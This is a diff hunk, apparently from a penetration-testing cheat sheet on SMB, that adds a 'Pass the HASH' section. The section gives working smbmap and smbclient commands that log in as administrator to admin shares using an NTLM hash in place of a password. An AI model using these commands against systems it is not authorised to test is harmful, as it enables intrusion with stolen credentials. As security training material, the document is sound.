@@ -149,7 +149,21 @@ SMB has been used primarily to connect Windows computers, although most other sy
 
 # mount -t cifs //192.168.1.140/data /mnt/d1 -nolock --rw			- Mount with read and write permission
 ```
+#### Pass the HASH
 
+```
+# smbmap -H 192.168.1.140 -u administrator -p 'LM_hash:NTLM_hash'
+
+# LM_hash	- aad3b435b51404eeaad3b435b51404ee (Empty value)
+
+# smbmap -H 192.168.1.140 -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C'
+
+# smbclient //IP$/FOLDER_NAME -U user_name --pw-nt-hash NTLM_HASH
+
+# smbclient //192.168.1.41/C$ -U administrator --pw-nt-hash 8846F7EAEE8FB117AD06BDD830B7586C
+
+
+```
 ### Enumeration Tools:
 SMB enumeration provide important information about our target.
 #### Nmap
